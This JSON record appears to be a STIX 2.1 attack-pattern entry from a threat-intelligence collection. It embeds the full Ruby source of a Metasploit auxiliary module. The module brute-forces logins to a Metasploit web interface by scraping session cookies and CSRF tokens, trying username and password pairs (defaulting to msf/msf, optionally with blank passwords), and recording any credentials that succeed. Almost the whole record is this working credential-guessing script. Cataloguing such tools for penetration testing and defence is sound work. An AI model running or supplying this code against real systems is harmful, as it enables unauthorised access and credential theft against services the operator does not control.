{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0cc35494-2c06-4372-9302-87bf2aa4cd64",
    "created": "2024-08-14T16:26:34.000902Z",
    "modified": "2024-08-14T16:26:34.000907Z",
    "name": "Metasploit Web Interface Login Utility",
    "description": " This module simply attempts to login to a Metasploit web interface using a specific user/pass. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/msf/msf_web_login.rb",
            "external_id": "msf_web_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'Metasploit Web Interface Login Utility',\n      'Description'    => %{\n        This module simply attempts to login to a Metasploit\n        web interface using a specific user/pass.\n      },\n      'Author'         => [ 'Vlatko Kosturjak <kost[at]linux.hr>' ],\n      'License'        => MSF_LICENSE,\n      'DefaultOptions' => { 'SSL' => true }\n    )\n\n    register_options(\n      [\n        Opt::RPORT(3790),\n        OptString.new('URILOGIN', [true, \"URI for Metasploit Web login. Default is /login\", \"/login\"]),\n        OptString.new('URIGUESS', [true, \"URI for Metasploit Web login. Default is /user_sessions\", \"/user_sessions\"]),\n        OptBool.new('BLANK_PASSWORDS', [false, \"Try blank passwords for all users\", false]),\n      ])\n\n    register_autofilter_ports([55553])\n  end\n\n  def run_host(ip)\n    begin\n      res = send_request_cgi({\n        'uri'     => datastore['URILOGIN'],\n        'method'  => 'GET'\n        }, 25)\n      http_fingerprint({ :response => res })\n    rescue ::Rex::ConnectionError => e\n      vprint_error(\"#{datastore['URILOGIN']} - #{e}\")\n      return\n    end\n\n    if not res\n      vprint_error(\" #{datastore['URILOGIN']} - No response\")\n      return\n    end\n    if !(res.code == 200 or res.code == 302)\n      vprint_error(\"Expected 200 HTTP code - not msf web? Got: #{res.code}\")\n      return\n    end\n    if res.body !~ /<title>Metasploit<\\/title>/\n      vprint_error(\"Expected metasploit page - not msf web interface? #{res.body}\")\n      return\n    end\n\n    each_user_pass do |user, pass|\n      do_login(user, pass)\n    end\n  end\n\n  def do_login(user='msf', pass='msf')\n    vprint_status(\" - Trying username:'#{user}' with password:'#{pass}'\")\n    begin\n      res = send_request_cgi({\n        'uri'     => datastore['URILOGIN'],\n        'method'  => 'GET'\n        }, 25)\n\n      token = ''\n      uisession = ''\n      if res and res.code == 200 and !res.get_cookies.empty?\n        # extract tokens from cookie\n        res.get_cookies.split(';').each {|c|\n          c.split(',').each {|v|\n            if v.split('=')[0] =~ /token/\n              token = v.split('=')[1]\n            elsif v.split('=')[0] =~ /_ui_session/\n              uisession = v.split('=')[1]\n            end\n          }\n        }\n        # extract authenticity_token from hidden field\n        atoken = res.body.scan(/<input name=\"authenticity_token\" type=\"hidden\" value=\"(.*)\"/).flatten[0]\n\n        if atoken.nil?\n          print_error(\"No auth token found\")\n          return :abort\n        end\n      else\n        print_error(\"Failed to get login cookies, aborting\")\n        return :abort\n      end\n\n      res = send_request_cgi(\n      {\n        'uri'       => datastore['URIGUESS'],\n        'method'    => 'POST',\n        'cookie'    => \"token=#{token}; _ui_session=#{uisession}\",\n        'vars_post' =>\n          {\n            'commit' => 'Sign in',\n            'utf8' => \"\\xE2\\x9C\\x93\",\n            'authenticity_token' => atoken,\n            'user_session[username]' => user,\n            'user_session[password]' => pass\n          }\n      }, 25)\n\n      if not res or res.code != 302\n        vprint_error(\"FAILED LOGIN. '#{user}' : '#{pass}' with code #{res.code}\")\n        return :skip_pass\n      end\n      if res.headers['Location'] =~ /\\/login/\n        vprint_error(\"FAILED LOGIN. '#{user}' : '#{pass}' with wrong redirect\")\n        return :skip_pass\n      else\n        print_good(\"SUCCESSFUL LOGIN. '#{user}' : '#{pass}'\")\n\n        report_cred(\n          ip: datastore['RHOST'],\n          port: datastore['RPORT'],\n          service_name: 'msf-web',\n          user: user,\n          password: pass,\n          proof: res.headers['Location']\n        )\n        return :next_user\n      end\n    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT\n      print_error(\"HTTP Connection Failed, Aborting\")\n      return :abort\n    end\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: Time.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\nend\n"
}